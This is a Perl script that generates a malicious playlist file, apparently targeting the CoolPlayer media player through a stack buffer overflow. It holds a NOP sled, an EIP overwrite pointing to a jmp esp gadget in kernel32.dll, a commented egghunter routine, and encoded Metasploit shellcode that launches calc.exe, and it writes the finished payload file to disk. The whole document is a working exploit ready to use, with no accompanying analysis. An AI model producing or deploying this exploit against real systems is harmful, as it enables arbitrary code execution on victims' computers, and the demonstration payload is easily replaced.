#!/usr/bin/perl

my $buffsize = 10000;           # set consistent buffer size
my $junk = "\x90" x 260;        # nops to slide into $jmp; offset to eip overwrite at 260
my $eip = pack('V',0x7c86467b); # jmp esp [kernel32.dll]
# Manipulate ESP to Point to Beyond
my $egghunter =           "\x89\xe2";             # mov ebx, esp
$egghunter = $egghunter . "\x83\xc2\x7d" x 4;     # add edx, 125 (x4)
# EggHunter
$egghunter = $egghunter . "\x66\x81\xCA\xFF\x0F"; # or dx,0x0fff
$egghunter = $egghunter . "\x42";                 # inc edx by 1
$egghunter = $egghunter . "\x52"; 		  # push edx to t
$egghunter = $egghunter . "\x6A\x43"; 		  # push byte +0x43
$egghunter = $egghunter . "\x58";  		  # pop eax
$egghunter = $egghunter . "\xCD\x2E"; 		  # int 0x2e
$egghunter = $egghunter . "\x3C\x05"; 		  # cmp al,0x5
$egghunter = $egghunter . "\x5A"; 		  # pop edx
$egghunter = $egghunter . "\x74\xEF"; 		  # jz 0x0
$egghunter = $egghunter . "\xB8\x50\x57\x4e\x44"; # mov eax,PWND 
$egghunter = $egghunter . "\x8B\xFA"; 		  # mov edi,edx
$egghunter = $egghunter . "\xAF"; 		  # scasd
$egghunter = $egghunter . "\x75\xEA"; 		  # jnz 0x5
$egghunter = $egghunter . "\xAF"; 		  # scasd
$egghunter = $egghunter . "\x75\xE7";		  #jnz 0x5
$egghunter = $egghunter . "\xFF\xE7"; 		  #jmp edi

my $egg = "\x50\x57\x4e\x44\x50\x57\x4e\x44"; #PWNDPWND
my $nops = "\x90" x 50;

# Calc.exe payload [size 227]
# msfpayload windows/exec CMD=calc.exe R |
# msfencode -e x86/shikata_ga_nai -t perl -c 1 -b '\x00\x0a\x0d\xff'
my $shell = "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" .
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1" .
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" .
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" .
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b" .
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2" .
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37" .
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3" .
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef" .
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb" .
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf" .
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
"\x9a\xca\xc0";


my $sploit = $junk.$eip.$egghunter.$egg.$nops.$shell; # build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
